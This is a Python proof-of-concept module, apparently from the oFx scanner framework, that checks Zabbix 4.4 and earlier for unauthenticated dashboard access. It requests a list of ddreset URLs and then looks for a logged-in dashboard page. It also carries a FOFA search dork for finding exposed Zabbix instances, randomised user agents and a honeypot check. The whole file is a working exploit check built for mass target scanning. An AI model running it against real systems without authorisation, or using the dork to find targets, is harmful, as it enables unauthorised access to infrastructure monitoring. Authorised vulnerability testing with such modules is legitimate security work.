# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "Zabbix未授权访问",  # 漏洞名称
        "VulnID": "oFx-2022-0001",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "Zabbix",  # 漏洞应用名称
        "AppVersion": "Zabbix<=4.4",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
        
        """,  # 漏洞简要描述

        "fofa-dork": """
            app="ZABBIX-监控系统"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        urls = [
            "/zabbix.php?action=dashboard.view",
            "/zabbix.php?action=dashboard.view&ddreset=1",
            "/zabbix.php?action=problem.view&ddreset=1",
            "/overview.php?ddreset=1",
            "/zabbix.php?action=web.view&ddreset=1",
            "/latest.php?ddreset=1",
            "/charts.php?ddreset=1",
            "/screens.php?ddreset=1",
            "/zabbix.php?action=map.view&ddreset=1",
            "/srv_status.php?ddreset=1",
            "/hostinventoriesoverview.php?ddreset=1",
            "/hostinventories.php?ddreset=1",
            "/report2.php?ddreset=1",
            "/toptriggers.php?ddreset=1",
            "/zabbix.php?action=dashboard.list",
            # "/zabbix.php?action=dashboard.view&dashboardid=1"
        ]

        for u in urls:
            url = self.target + u  # url自己按需调整

            headers = {
                "User-Agent": get_random_ua(),
                "Connection": "close",
                # "Content-Type": "application/x-www-form-urlencoded",
            }

            try:
                """
                检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
                """
                ses = requests.session()
                req0 = ses.get(url, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
                req1 = ses.get(self.target + "/zabbix.php?action=dashboard.view&dashboardid=1", headers=headers,
                               proxies=self.proxy, timeout=self.timeout, verify=False)
                if "<title>Dashboard</title>" in req1.text and req1.status_code == 200 and "text/html" in req1.headers[
                    "Content-Type"] and "<a class=\"top-nav-signout\" title=\"Sign out\" onclick=\"javascript:" in req1.text:  # req.status_code == 200 and :
                    vuln = [True, req1.text]
                    return vuln
                else:
                    vuln = [False, req1.text]
            except Exception as e:
                raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
